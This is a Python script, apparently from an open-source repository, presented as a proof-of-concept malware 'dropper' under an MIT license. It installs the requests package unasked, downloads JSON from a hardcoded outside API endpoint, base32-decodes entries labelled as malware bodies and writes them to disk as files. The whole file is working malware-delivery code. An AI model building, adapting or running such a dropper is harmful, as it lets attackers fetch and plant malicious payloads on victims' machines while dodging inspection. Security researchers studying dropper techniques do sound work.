##############################################################################
# Offline Py-JSON-Dropper - dropper - Python Script
# Description: A POC for JSON dropper(drop by fetching API JSON). It will ask for malware path and create a new json file with encode malware bodies.
# Author: Dor Dahan
# License: MIT (See details in the LICENSE file or at the end of this script)
##############################################################################
import pip

# The API url fetch the json dropper
URL = "https://api.npoint.io/531896996f8103fa82c3"
# The pip packages to install
packages = ["requests"]

def install_package(package_name):
    # Will install the packages requirements for the script to run.
    while True:
        try:
            pip.main(["install", package_name])
            break
        except Exception:
            continue

def main():
    import base64, requests
    # Getting the response from the api server
    response = requests.get(url=URL).json()
    # Looping throw the keys in the json format
    for index, key in enumerate(response):
        # Create new file name via the index and file name
        filename = response[key]["fullName"].split(".")
        extension = filename[-1]
        # check if there is more than one dot in the file name
        if len(filename) > 2:
            filename = ".".join(filename[:-1])
        # Inserting the malware body into the new file name
        with open(f"{filename[0]}_{index}.{extension}", "wb") as file:
            # Fetch the body of the malware
            malware = response[key]["body"]
            # Encoding the body back to binary format
            decoded = malware.encode("utf-8")
            # Decoding the body to insert into the file
            decoded = base64.b32decode(decoded)
            file.write(decoded)


if __name__ == '__main__':
    # Install packages
    for package in packages:
        install_package(package)
    # Start the script
    main()

# License Information
# This script is open-source and released under the MIT License.
# MIT License
# Copyright (c) 2023 Dor Dahan
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
# For more details, see the LICENSE file in the root directory of this repository
# or visit https://github.com/D0rDa4aN919/Py-JSON-Dropper.
